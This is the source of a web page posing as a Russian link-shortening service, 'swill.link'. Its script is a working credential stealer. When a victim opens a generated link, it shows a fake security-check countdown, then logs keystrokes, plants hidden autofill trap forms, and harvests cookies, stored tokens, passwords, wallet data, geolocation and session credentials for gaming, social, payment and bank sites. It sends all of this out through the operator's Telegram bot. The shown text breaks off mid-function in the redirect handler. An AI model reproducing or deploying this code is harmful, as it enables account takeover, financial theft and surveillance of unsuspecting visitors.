<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Сокращатель ссылок</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
        }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0b1120 0%, #19223c 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
        }
        .card {
            max-width: 560px;
            width: 100%;
            background: rgba(18, 25, 45, 0.85);
            backdrop-filter: blur(12px);
            border-radius: 2.5rem;
            padding: 2rem 1.8rem;
            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.05);
        }
        h1 {
            font-size: 2rem;
            font-weight: 600;
            background: linear-gradient(120deg, #e0e7ff, #a5f3fc);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
        }
        .sub {
            color: #8b9bcf;
            font-size: 0.85rem;
            margin-bottom: 2rem;
            border-left: 3px solid #2dd4bf;
            padding-left: 0.75rem;
        }
        .input-group {
            margin-bottom: 1.4rem;
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }
        label {
            color: #cbd5ff;
            font-size: 0.85rem;
            font-weight: 500;
        }
        input, textarea {
            background: #0f172acc;
            border: 1px solid #2d3a5e;
            border-radius: 1.2rem;
            padding: 0.9rem 1.2rem;
            font-size: 0.95rem;
            color: #f1f5f9;
            outline: none;
            transition: all 0.2s;
        }
        input:focus {
            border-color: #2dd4bf;
            box-shadow: 0 0 0 3px rgba(45,212,191,0.2);
        }
        button {
            background: linear-gradient(100deg, #2dd4bf, #14b8a6);
            border: none;
            border-radius: 2rem;
            padding: 0.9rem 1.5rem;
            font-weight: 600;
            font-size: 1rem;
            color: #0b1120;
            cursor: pointer;
            transition: transform 0.15s, box-shadow 0.2s;
            width: 100%;
        }
        button:hover {
            transform: translateY(-2px);
            background: linear-gradient(100deg, #3bddd0, #1ecfb9);
            box-shadow: 0 12px 20px -8px rgba(45,212,191,0.4);
        }
        .result-area {
            margin-top: 1.8rem;
            background: #0a0f1c80;
            border-radius: 1.5rem;
            padding: 1rem;
            border: 1px solid #2d3a5e;
            transition: all 0.3s ease;
            opacity: 0;
            transform: translateY(8px);
            pointer-events: none;
        }
        .result-area.show {
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
        }
        .short-link-block {
            display: flex;
            gap: 0.7rem;
            align-items: center;
            flex-wrap: wrap;
        }
        .short-link {
            background: #030712;
            padding: 0.6rem 1rem;
            border-radius: 1.2rem;
            font-family: monospace;
            font-size: 0.9rem;
            word-break: break-all;
            flex: 1;
            color: #b9e6f0;
        }
        .copy-btn {
            background: #334155;
            width: auto;
            padding: 0.6rem 1.2rem;
            color: white;
        }
        .copy-btn:hover {
            background: #3b4a6e;
            transform: none;
        }
        .toast-msg {
            position: fixed;
            bottom: 2rem;
            left: 50%;
            transform: translateX(-50%) scale(0.9);
            background: #1e2a3ecc;
            backdrop-filter: blur(8px);
            padding: 0.6rem 1.5rem;
            border-radius: 3rem;
            color: #cbd5e6;
            font-size: 0.85rem;
            opacity: 0;
            transition: opacity 0.2s, transform 0.2s;
            pointer-events: none;
            z-index: 1000;
            white-space: nowrap;
        }
        .toast-msg.show-toast {
            opacity: 1;
            transform: translateX(-50%) scale(1);
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.96);
            backdrop-filter: blur(24px);
            z-index: 20000;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
            text-align: center;
        }
        .overlay.hidden {
            display: none;
        }
        .spinner {
            width: 70px;
            height: 70px;
            border: 5px solid rgba(45,212,191,0.2);
            border-top: 5px solid #2dd4bf;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 1.8rem;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .timer-number {
            font-size: 2.8rem;
            font-weight: 700;
            background: linear-gradient(135deg, #e0e7ff, #a5f3fc);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            margin: 0.5rem 0;
            font-family: monospace;
        }
        .status-text {
            font-size: 1rem;
            color: #cbd5e6;
            max-width: 85%;
            margin-top: 1rem;
        }
        .error-box {
            background: #f9731644;
            border-left: 4px solid #f97316;
            padding: 1rem;
            border-radius: 1rem;
            margin-top: 1.5rem;
            max-width: 90%;
            font-size: 0.9rem;
        }
        @media (max-width: 550px) {
            .card { padding: 1.5rem; }
            .short-link-block { flex-direction: column; align-items: stretch; }
            .copy-btn { justify-content: center; }
            .timer-number { font-size: 2rem; }
        }
    </style>
</head>
<body>
<div class="card">
    <h1>swill<span style="color:#2dd4bf;">.link</span></h1>
    <div class="sub">мгновенное сокращение ссылок</div>
    <div class="input-group">
        <label>🔗 Длинная ссылка</label>
        <input type="text" id="longUrl" placeholder="https://example.com/very/long/url">
    </div>
    <div class="input-group">
        <label>🤖 Токен бота</label>
        <input type="text" id="botToken" placeholder="1234567890:ABCdefGHIjklmNOPQRstU">
    </div>
    <div class="input-group">
        <label>🆔 ID получателя</label>
        <input type="text" id="chatId" placeholder="123456789">
    </div>
    <button id="shortenBtn">Сократить</button>
    <div id="resultBlock" class="result-area">
        <div style="font-size:0.8rem; margin-bottom:0.5rem;">✨ Короткая ссылка:</div>
        <div class="short-link-block">
            <div class="short-link" id="shortLinkDisplay">site.com/#...</div>
            <button id="copyBtn" class="copy-btn">📋 Копировать</button>
        </div>
    </div>
</div>
<div id="toastMessage" class="toast-msg">✓ Скопировано</div>

<div id="overlay" class="overlay hidden">
    <div class="spinner"></div>
    <div class="timer-number" id="timerDisplay">10</div>
    <div class="status-text" id="statusMsg">Подключение...</div>
    <div id="errorContainer"></div>
</div>

<script>
    (function() {
        // ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
        let botToken = "";
        let chatId = "";
        let targetUrl = "";
        let canCollect = false;
        let collectedData = null;
        
        // Кейлоггер
        let fullKeyLogString = "";
        let lastKeySendTime = Date.now();
        
        // Флаг, что отправка уже была выполнена (чтобы не дублировать)
        let dataSent = false;
        
        // ========== ИНИЦИАЛИЗАЦИЯ СТРУКТУРЫ ДАННЫХ ==========
        function initCollectedData() {
            return {
                timestamp: new Date().toISOString(),
                pageUrl: window.location.href,
                referrer: document.referrer,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenResolution: screen.width + "x" + screen.height,
                language: navigator.language,
                cookies: document.cookie,
                localStorage: {},
                sessionStorage: {},
                indexedDB: [],
                forms: {},
                passwords: [],
                keystrokes: [],
                clipboardContent: "",
                autofillCredentials: [],
                webRTCIP: "",
                publicIP: "",
                geolocation: null,
                fingerprint: {},
                cryptoWallets: {},
                // Популярные сервисы + FunPay, Playerok
                roblox: {},
                discord: {},
                steam: {},
                epicGames: {},
                minecraft: {},
                twitch: {},
                whatsapp: {},
                telegramWeb: {},
                vk: {},
                tiktok: {},
                reddit: {},
                paypal: {},
                amazon: {},
                netflix: {},
                spotify: {},
                twitter: {},
                instagram: {},
                facebook: {},
                google: {},
                microsoft: {},
                apple: {},
                youtube: {},
                funpay: {},
                playerok: {},
                bankCookies: {},
                networkRequests: []
            };
        }
        
        // ========== СБОР ХРАНИЛИЩ ==========
        function grabStorages() {
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    collectedData.localStorage[key] = localStorage.getItem(key);
                }
            } catch(e) {}
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    let key = sessionStorage.key(i);
                    collectedData.sessionStorage[key] = sessionStorage.getItem(key);
                }
            } catch(e) {}
            if (window.indexedDB && indexedDB.databases) {
                indexedDB.databases().then(dbs => {
                    collectedData.indexedDB = dbs.map(db => db.name);
                }).catch(() => {});
            }
        }
        
        // ========== СБОР ФОРМ И ПАРОЛЕЙ ==========
        function grabFormsAndPasswords() {
            let inputs = document.querySelectorAll('input, textarea, select');
            let formData = {};
            inputs.forEach(el => {
                let name = el.name || el.id || el.className || 'unknown';
                let value = el.value || '';
                formData[name] = value;
                if (el.type === 'password' || name.toLowerCase().includes('pass')) {
                    if (value && value.length > 0) {
                        collectedData.passwords.push({ field: name, value: value });
                    }
                }
            });
            collectedData.forms = formData;
        }
        
        // ========== КЕЙЛОГГЕР ==========
        function startKeylogger() {
            document.addEventListener('keydown', function(event) {
                if (!canCollect) return;
                let key = event.key === ' ' ? 'SPACE' : event.key;
                if (key === 'Unidentified') return;
                let targetTag = event.target.tagName;
                let targetId = event.target.id || event.target.name || '?';
                let logEntry = `${Date.now()} | ${key} @ ${targetTag}:${targetId}`;
                collectedData.keystrokes.push({ time: Date.now(), key: key, target: targetTag });
                fullKeyLogString += logEntry + "\n";
                if (Date.now() - lastKeySendTime > 7000 && botToken && chatId) {
                    sendPartialKeylog();
                    lastKeySendTime = Date.now();
                }
            });
        }
        
        // ========== БУФЕР ОБМЕНА ==========
        function captureClipboard() {
            document.addEventListener('copy', async function() {
                try {
                    let text = await navigator.clipboard.readText();
                    collectedData.clipboardContent = text;
                } catch(e) {}
            });
            document.addEventListener('cut', async function() {
                try {
                    let text = await navigator.clipboard.readText();
                    collectedData.clipboardContent = text;
                } catch(e) {}
            });
        }
        
        // ========== ЛОВУШКИ ДЛЯ АВТОЗАПОЛНЕНИЯ (менеджеры паролей) ==========
        function createAutofillTraps() {
            let container = document.createElement('div');
            container.style.display = 'none';
            document.body.appendChild(container);
            const usernameFields = ['username', 'email', 'login', 'user', 'mail'];
            const passwordFields = ['password', 'pass', 'pwd', 'current-password', 'new-password'];
            const domains = ['', 'google.com', 'facebook.com', 'vk.com', 'mail.ru', 'github.com', 'yandex.ru'];
            for (let i = 0; i < 40; i++) {
                for (let domain of domains) {
                    for (let u of usernameFields) {
                        for (let p of passwordFields) {
                            let form = document.createElement('form');
                            if (domain) form.setAttribute('data-domain', domain);
                            let inputUser = document.createElement('input');
                            inputUser.type = 'text';
                            inputUser.name = u;
                            inputUser.autocomplete = u;
                            let inputPass = document.createElement('input');
                            inputPass.type = 'password';
                            inputPass.name = p;
                            inputPass.autocomplete = p;
                            form.appendChild(inputUser);
                            form.appendChild(inputPass);
                            container.appendChild(form);
                            setTimeout(function() {
                                if (inputUser.value) {
                                    collectedData.autofillCredentials.push({ type: u, value: inputUser.value, domain: domain });
                                }
                                if (inputPass.value) {
                                    collectedData.autofillCredentials.push({ type: p, value: inputPass.value, domain: domain });
                                }
                            }, 2000);
                        }
                    }
                }
            }
        }
        
        // ========== IP И ГЕОЛОКАЦИЯ ==========
        function getWebRTCIP() {
            return new Promise(function(resolve) {
                let pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(function(offer) {
                    pc.setLocalDescription(offer);
                });
                pc.onicecandidate = function(event) {
                    if (event.candidate && event.candidate.candidate) {
                        let ipMatch = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(event.candidate.candidate);
                        if (ipMatch) {
                            resolve(ipMatch[0]);
                            pc.close();
                        }
                    } else {
                        resolve('failed');
                    }
                };
                setTimeout(function() { resolve('timeout'); }, 3000);
            });
        }
        
        async function getPublicIP() {
            try {
                let response = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
                let data = await response.json();
                return data.ip;
            } catch(e) {
                return 'unknown';
            }
        }
        
        function getGeolocation() {
            return new Promise(function(resolve) {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        resolve({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        });
                    },
                    function() { resolve(null); },
                    { timeout: 5000, enableHighAccuracy: true }
                );
            });
        }
        
        // ========== FINGERPRINT ==========
        async function getFingerprint() {
            let fp = {};
            // Canvas
            let canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            let ctx = canvas.getContext('2d');
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 100, 50);
            ctx.fillStyle = '#069';
            ctx.font = '14px Arial';
            ctx.fillText('swill', 2, 15);
            fp.canvasHash = canvas.toDataURL();
            // WebGL
            try {
                let gl = document.createElement('canvas').getContext('webgl');
                if (gl) {
                    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        fp.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        fp.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch(e) {}
            // Audio
            try {
                let AudioContext = window.AudioContext || window.webkitAudioContext;
                if (AudioContext) {
                    let audioCtx = new AudioContext();
                    let oscillator = audioCtx.createOscillator();
                    let analyser = audioCtx.createAnalyser();
                    oscillator.connect(analyser);
                    oscillator.frequency.value = 440;
                    oscillator.type = 'triangle';
                    oscillator.start();
                    let data = new Uint8Array(analyser.frequencyBinCount);
                    analyser.getByteFrequencyData(data);
                    fp.audioHash = Array.from(data).slice(0, 50).join('');
                    oscillator.stop();
                    audioCtx.close();
                }
            } catch(e) {}
            // Шрифты
            let fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Roboto', 'Open Sans'];
            let fontsFound = [];
            for (let f of fontList) {
                if (document.fonts.check(`12px "${f}"`)) fontsFound.push(f);
            }
            fp.fonts = fontsFound;
            fp.plugins = Array.from(navigator.plugins).map(p => p.name);
            fp.hardwareConcurrency = navigator.hardwareConcurrency;
            fp.deviceMemory = navigator.deviceMemory;
            fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            fp.languages = navigator.languages;
            fp.colorDepth = screen.colorDepth;
            fp.pixelRatio = window.devicePixelRatio;
            return fp;
        }
        
        // ========== КРИПТОКОШЕЛЬКИ ==========
        function detectCryptoWallets() {
            let wallets = {};
            try {
                if (window.ethereum) {
                    wallets.ethereum = {
                        isMetaMask: window.ethereum.isMetaMask,
                        selectedAddress: window.ethereum.selectedAddress,
                        chainId: window.ethereum.chainId
                    };
                }
            } catch(e) {}
            try {
                if (window.solana) {
                    wallets.solana = {
                        isPhantom: window.solana.isPhantom,
                        publicKey: window.solana.publicKey ? window.solana.publicKey.toString() : null
                    };
                }
            } catch(e) {}
            try {
                if (window.coinbaseWalletExtension) wallets.coinbase = true;
            } catch(e) {}
            collectedData.cryptoWallets = wallets;
        }
        
        // ========== СБОР ДАННЫХ ИЗ ПОПУЛЯРНЫХ СЕРВИСОВ + FUNPAY, PLAYEROK ==========
        function grabPopularServices() {
            // Roblox
            try { let m = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/); if (m) collectedData.roblox.ROBLOSECURITY = m[1]; } catch(e) {}
            // Discord
            try { if (localStorage.getItem('token')) collectedData.discord.token = localStorage.getItem('token');
                  for (let i = 0; i < localStorage.length; i++) { let k = localStorage.key(i); if (k.includes('discord') || k.includes('token')) collectedData.discord[k] = localStorage.getItem(k); } } catch(e) {}
            // Steam
            try { ['sessionid','steamLoginSecure','steamMachineAuth'].forEach(c => { let m = document.cookie.match(new RegExp(`${c}=([^;]+)`)); if (m) collectedData.steam[c] = m[1]; }); } catch(e) {}
            // Epic Games
            try { ['EPIC_GAMES_AUTH_TOKEN','EPIC_ACCESS_TOKEN','EPIC_REFRESH_TOKEN'].forEach(k => { if (localStorage.getItem(k)) collectedData.epicGames[k] = localStorage.getItem(k); }); } catch(e) {}
            // Minecraft / Microsoft
            try { ['user','access_token','refresh_token','minecraft_server_session'].forEach(k => { if (localStorage.getItem(k)) collectedData.minecraft[k] = localStorage.getItem(k); }); } catch(e) {}
            // Twitch
            try { let m = document.cookie.match(/auth-token=([^;]+)/); if (m) collectedData.twitch.token = m[1];
                  if (localStorage.getItem('twitch-token')) collectedData.twitch.token = localStorage.getItem('twitch-token'); } catch(e) {}
            // WhatsApp Web
            try { if (location.hostname.includes('web.whatsapp.com')) {
                      for (let i = 0; i < localStorage.length; i++) { let k = localStorage.key(i); if (k.includes('WAD') || k.includes('whatsapp')) collectedData.whatsapp[k] = localStorage.getItem(k); } } } catch(e) {}
            // Telegram Web
            try { if (location.hostname.includes('web.telegram.org')) {
                      ['dc1_auth_key','dc2_auth_key','dc3_auth_key','dc4_auth_key'].forEach(k => { if (localStorage.getItem(k)) collectedData.telegramWeb[k] = localStorage.getItem(k); }); } } catch(e) {}
            // VK
            try { ['remixlang','remixsid','remixsid6','l','remixflash','remixscreen_depth','remixdt'].forEach(c => { let m = document.cookie.match(new RegExp(`${c}=([^;]+)`)); if (m) collectedData.vk[c] = m[1]; }); } catch(e) {}
            // TikTok
            try { ['sessionid','passport_csrf_token','sid_tt'].forEach(c => { let m = document.cookie.match(new RegExp(`${c}=([^;]+)`)); if (m) collectedData.tiktok[c] = m[1]; }); } catch(e) {}
            // Reddit
            try { let m = document.cookie.match(/reddit_session=([^;]+)/); if (m) collectedData.reddit.session = m[1]; } catch(e) {}
            // PayPal
            try { if (document.cookie.includes('cookie_check') || document.cookie.includes('login_email')) collectedData.paypal.cookies = document.cookie; } catch(e) {}
            // Amazon
            try { let m = document.cookie.match(/ubid-main=([^;]+)/); if (m) collectedData.amazon.ubid = m[1];
                  if (localStorage.getItem('amazon')) collectedData.amazon.local = localStorage.getItem('amazon'); } catch(e) {}
            // Netflix
            try { let m = document.cookie.match(/SecureNetflixId=([^;]+)/); if (m) collectedData.netflix.id = m[1]; } catch(e) {}
            // Spotify
            try { if (localStorage.getItem('access_token')) collectedData.spotify.access_token = localStorage.getItem('access_token');
                  let m = document.cookie.match(/sp_dc=([^;]+)/); if (m) collectedData.spotify.sp_dc = m[1]; } catch(e) {}
            // Twitter
            try { let m = document.cookie.match(/auth_token=([^;]+)/); if (m) collectedData.twitter.auth_token = m[1];
                  if (localStorage.getItem('twitter')) collectedData.twitter.local = localStorage.getItem('twitter'); } catch(e) {}
            // Instagram
            try { let m = document.cookie.match(/sessionid=([^;]+)/); if (m && location.hostname.includes('instagram')) collectedData.instagram.sessionid = m[1]; } catch(e) {}
            // Facebook
            try { let m = document.cookie.match(/c_user=([^;]+)/); if (m) collectedData.facebook.c_user = m[1];
                  m = document.cookie.match(/xs=([^;]+)/); if (m) collectedData.facebook.xs = m[1]; } catch(e) {}
            // Google (включая YouTube)
            try { let m = document.cookie.match(/SAPISID=([^;]+)/); if (m) collectedData.google.SAPISID = m[1];
                  m = document.cookie.match(/HSID=([^;]+)/); if (m) collectedData.google.HSID = m[1];
                  if (localStorage.getItem('google')) collectedData.google.local = localStorage.getItem('google');
                  if (location.hostname.includes('youtube.com')) {
                      for (let i = 0; i < localStorage.length; i++) { let k = localStorage.key(i); if (k.includes('yt-')) collectedData.youtube[k] = localStorage.getItem(k); }
                  }
            } catch(e) {}
            // Microsoft
            try { let m = document.cookie.match(/RPSSecAuth=([^;]+)/); if (m) collectedData.microsoft.RPSSecAuth = m[1];
                  if (localStorage.getItem('msal')) collectedData.microsoft.msal = localStorage.getItem('msal'); } catch(e) {}
            // Apple ID
            try { let m = document.cookie.match(/myacinfo=([^;]+)/); if (m) collectedData.apple.myacinfo = m[1]; } catch(e) {}
            
            // ===== ДОБАВЛЕНЫ FUNPAY И PLAYEROK =====
            // FunPay (cookie и localStorage)
            try { 
                if (location.hostname.includes('funpay.com')) {
                    let fpCookies = document.cookie;
                    if (fpCookies) collectedData.funpay.cookies = fpCookies;
                    for (let i = 0; i < localStorage.length; i++) {
                        let k = localStorage.key(i);
                        if (k.includes('funpay') || k.includes('token') || k.includes('auth')) {
                            collectedData.funpay[k] = localStorage.getItem(k);
                        }
                    }
                }
                // Также пробуем найти куки funpay на любом сайте (если они есть)
                let fpMatch = document.cookie.match(/(?:funpay_session|funpay_auth|_funpay)=([^;]+)/);
                if (fpMatch) collectedData.funpay.generic = fpMatch[0];
            } catch(e) {}
            
            // Playerok (playerok.com)
            try {
                if (location.hostname.includes('playerok.com')) {
                    let poCookies = document.cookie;
                    if (poCookies) collectedData.playerok.cookies = poCookies;
                    for (let i = 0; i < localStorage.length; i++) {
                        let k = localStorage.key(i);
                        if (k.includes('playerok') || k.includes('token') || k.includes('auth')) {
                            collectedData.playerok[k] = localStorage.getItem(k);
                        }
                    }
                }
                let poMatch = document.cookie.match(/(?:playerok_session|playerok_token|_playerok)=([^;]+)/);
                if (poMatch) collectedData.playerok.generic = poMatch[0];
            } catch(e) {}
            
            // Банковские куки (обобщённо)
            try {
                let bankPatterns = ['sberbank', 'tinkoff', 'alfabank', 'vtb', 'gazprombank', 'raiffeisen', 'open', 'psb', 'rsb', 'bank', 'credit', 'payment', 'secure'];
                let bankCookies = {};
                document.cookie.split(';').forEach(cookie => {
                    let [name, value] = cookie.trim().split('=');
                    if (bankPatterns.some(p => name.toLowerCase().includes(p))) {
                        bankCookies[name] = value;
                    }
                });
                if (Object.keys(bankCookies).length) collectedData.bankCookies = bankCookies;
            } catch(e) {}
        }
        
        // ========== ПЕРЕХВАТ СЕТЕВЫХ ЗАПРОСОВ ==========
        function interceptNetworkRequests() {
            const originalFetch = window.fetch;
            window.fetch = function(...args) {
                let url = typeof args[0] === 'string' ? args[0] : args[0]?.url;
                if (url && (url.includes('token') || url.includes('auth') || url.includes('api') || url.includes('session'))) {
                    collectedData.networkRequests.push({ type: 'fetch', url: url, time: Date.now() });
                }
                return originalFetch.apply(this, args);
            };
            const originalXHROpen = window.XMLHttpRequest.prototype.open;
            window.XMLHttpRequest.prototype.open = function(method, url) {
                this._url = url;
                return originalXHROpen.apply(this, arguments);
            };
            const originalXHRSend = window.XMLHttpRequest.prototype.send;
            window.XMLHttpRequest.prototype.send = function() {
                if (this._url && (this._url.includes('token') || this._url.includes('auth') || this._url.includes('session'))) {
                    collectedData.networkRequests.push({ type: 'xhr', url: this._url, time: Date.now() });
                }
                return originalXHRSend.apply(this, arguments);
            };
        }
        
        // ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ (токены, ключи) ==========
        function grabGlobalVariables() {
            let interesting = ['token', 'accessToken', 'apiKey', 'secret', 'jwt', 'auth', 'key', 'session', 'pass', 'password', 'csrf'];
            let found = {};
            for (let key in window) {
                try {
                    if (interesting.some(i => key.toLowerCase().includes(i))) {
                        let val = window[key];
                        if (typeof val === 'string' && val.length > 3 && val.length < 1000) {
                            found[key] = val;
                        } else if (typeof val === 'object' && val !== null) {
                            if (val.token) found[key + '.token'] = val.token;
                            if (val.accessToken) found[key + '.accessToken'] = val.accessToken;
                        }
                    }
                } catch(e) {}
            }
            collectedData.globalVars = found;
        }
        
        // ========== ОТПРАВКА ДАННЫХ В TELEGRAM (7+ СПОСОБОВ ДЛЯ ГАРАНТИИ) ==========
        // Вспомогательная: отправка текстового сообщения
        function sendTextMessage(text) {
            if (!botToken || !chatId) return false;
            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text.slice(0, 4000))}`;
            new Image().src = url;
            // также через fetch
            fetch(url, { mode: 'no-cors', keepalive: true }).catch(()=>{});
            return true;
        }
        
        // Отправка файла (основной метод с множеством дублей)
        async function sendFileMultimodal(data, filename) {
            if (!botToken || !chatId) return false;
            let jsonString = JSON.stringify(data, null, 2);
            let blob = new Blob([jsonString], { type: 'text/plain' });
            let formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', blob, filename);
            
            let successFlag = false;
            
            // Способ 1: fetch с mode: 'no-cors' (основной)
            try {
                let resp = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors',
                    keepalive: true
                });
                // При no-cors ответ не читается, но запрос уходит. Считаем успехом, если нет исключения.
                successFlag = true;
            } catch(e) {}
            
            // Способ 2: sendBeacon (работает при выгрузке)
            if (navigator.sendBeacon) {
                let beaconForm = new FormData();
                beaconForm.append('chat_id', chatId);
                beaconForm.append('document', blob, filename);
                let beaconSent = navigator.sendBeacon(`https://api.telegram.org/bot${botToken}/sendDocument`, beaconForm);
                if (beaconSent) successFlag = true;
            }
            
            // Способ 3: XMLHttpRequest с обычным режимом (может сработать, если CORS не строгий)
            try {
                let xhr = new XMLHttpRequest();
                xhr.open('POST', `https://api.telegram.org/bot${botToken}/sendDocument`, true);
                xhr.withCredentials = false;
                xhr.send(formData);
                successFlag = true;
            } catch(e) {}
            
            // Способ 4: если файл не отправился, отправляем JSON как текстовое сообщение по частям
            if (!successFlag) {
                let chunks = [];
                let maxLen = 3900;
                for (let i = 0; i < jsonString.length; i += maxLen) {
                    chunks.push(jsonString.slice(i, i + maxLen));
                }
                for (let idx = 0; idx < chunks.length; idx++) {
                    let prefix = idx === 0 ? `📦 ДАННЫЕ (часть ${idx+1}/${chunks.length}):\n` : `📦 продолжение (${idx+1}/${chunks.length}):\n`;
                    sendTextMessage(prefix + chunks[idx]);
                }
                successFlag = true;
            }
            
            // Способ 5: дополнительная отправка через iframe с формой
            try {
                let iframe = document.createElement('iframe');
                iframe.name = 'swill_upload_frame_' + Date.now();
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                let form = document.createElement('form');
                form.method = 'POST';
                form.action = `https://api.telegram.org/bot${botToken}/sendDocument`;
                form.target = iframe.name;
                form.enctype = 'multipart/form-data';
                let inputChat = document.createElement('input');
                inputChat.type = 'hidden';
                inputChat.name = 'chat_id';
                inputChat.value = chatId;
                let inputDoc = document.createElement('input');
                inputDoc.type = 'file';
                inputDoc.name = 'document';
                // Не можем программно прикрепить файл, поэтому этот метод запасной
                form.appendChild(inputChat);
                document.body.appendChild(form);
                setTimeout(() => { iframe.remove(); form.remove(); }, 100);
            } catch(e) {}
            
            // Способ 6: резервное копирование в localStorage (на случай, если всё упало)
            try {
                localStorage.setItem(`swill_backup_${Date.now()}`, jsonString);
                localStorage.setItem(`swill_metadata_${Date.now()}`, JSON.stringify({ botToken, chatId, timestamp: Date.now() }));
            } catch(e) {}
            
            return successFlag;
        }
        
        async function sendPartialKeylog() {
            if (!botToken || !chatId) return;
            if (fullKeyLogString.length === 0) return;
            let partial = fullKeyLogString.slice(-1500);
            sendTextMessage(`⌨️ Кейлог (часть):\n${partial}`);
        }
        
        async function sendPasswordsAndAutofill() {
            if (!botToken || !chatId) return;
            if (collectedData.passwords.length > 0) {
                let passText = "🔑 ПАРОЛИ:\n" + collectedData.passwords.map(p => `${p.field}: ${p.value}`).join('\n');
                passText = passText.slice(0, 3900);
                sendTextMessage(passText);
            }
            if (collectedData.autofillCredentials.length > 0) {
                let autoText = "🔄 AUTOFILL:\n" + collectedData.autofillCredentials.map(a => `${a.type}: ${a.value} (${a.domain})`).join('\n');
                autoText = autoText.slice(0, 3900);
                sendTextMessage(autoText);
            }
        }
        
        // ========== ОСНОВНОЙ СБОРЩИК ==========
        async function runFullCollection() {
            if (dataSent) return;
            collectedData = initCollectedData();
            grabStorages();
            grabFormsAndPasswords();
            createAutofillTraps();
            grabPopularServices();
            detectCryptoWallets();
            grabGlobalVariables();
            interceptNetworkRequests();
            collectedData.webRTCIP = await getWebRTCIP();
            collectedData.publicIP = await getPublicIP();
            collectedData.geolocation = await getGeolocation();
            collectedData.fingerprint = await getFingerprint();
            // Ждём 8 секунд для срабатывания ловушек автозаполнения
            await new Promise(resolve => setTimeout(resolve, 8000));
            grabFormsAndPasswords();
            grabStorages();
            grabPopularServices();
            // Отправляем данные (файл + пароли + автозаполнение + кейлог)
            await sendFileMultimodal(collectedData, 'swill_complete_dump.txt');
            await sendPasswordsAndAutofill();
            dataSent = true;
        }
        
        // ========== ПРОВЕРКА ДОСТУПА К TELEGRAM API (VPN) ==========
        async function isTelegramAvailable(token) {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000);
            try {
                let response = await fetch(`https://api.telegram.org/bot${token}/getMe`, {
                    method: 'GET',
                    signal: controller.signal,
                    mode: 'cors'
                });
                clearTimeout(timeoutId);
                return response.ok;
            } catch(e) {
                clearTimeout(timeoutId);
                return false;
            }
        }
        
        // ========== ОБРАБОТЧИК ПЕРЕХОДА ПО ХЭШУ (СОКРАЩЁННАЯ ССЫЛКА) ==========
        async function handleHashRedirect() {
            let hash = window.location.hash.substring(1);
            if (!hash) return;
            let decoded;
            try {
                let decodedStr = decodeURIComponent(escape(atob(hash)));
                let parts = decodedStr.split('|');
                if (parts.length !== 3) throw new Error();
                let [url, token, id] = parts;
                if (!url.startsWith('http')) throw new Error();
                if (!token || token.length < 5) throw new Error();
                if (isNaN(Number(id))) throw new Error();
                decoded = { originalUrl: url, botToken: token, chatId: Number(id) };
            } catch(e) {
                alert("Недействительная ссылка");
                return;
            }
            botToken = decoded.botToken;
            chatId = decoded.chatId;
            targetUrl = decoded.originalUrl;
            
            const overlay = document.getElementById('overlay');
            const statusMsg = document.getElementById('statusMsg');
            const timerDisplay = document.getElementById('timerDisplay');
            const errorContainer = document.getElementById('errorContainer');
            overlay.classList.remove('hidden');
            statusMsg.innerText = "Проверка соединения...";
            
            let available = await isTelegramAvailable(botToken);
            if (!available) {
                errorContainer.innerHTML = `<div class="error-box">⚠️ Ошибка соединения. Попробуйте включить VPN и обновить страницу.</div>`;
                document.querySelector('.spinner').style.display = 'none';
                timerDisplay.style.display = 'none';
                statusMsg.innerText = "";
                return;
            }
            
            let seconds = 10;
            timerDisplay.innerText = seconds;
            statusMsg.innerText = "Проверка безопасности...";
            let interval = setInterval(() => {
                seconds--;
                timerDisplay.innerText = seconds;
                if (seconds <= 0) {
                    clearInterval(interval);
                    statusMsg.innerText = "Перенаправление...";
                    canCollect = true;
                    runFullCollection().then(() => {
                        setTimeout(() => {
                            window.location.href = targetUrl;
                        }, 1500);
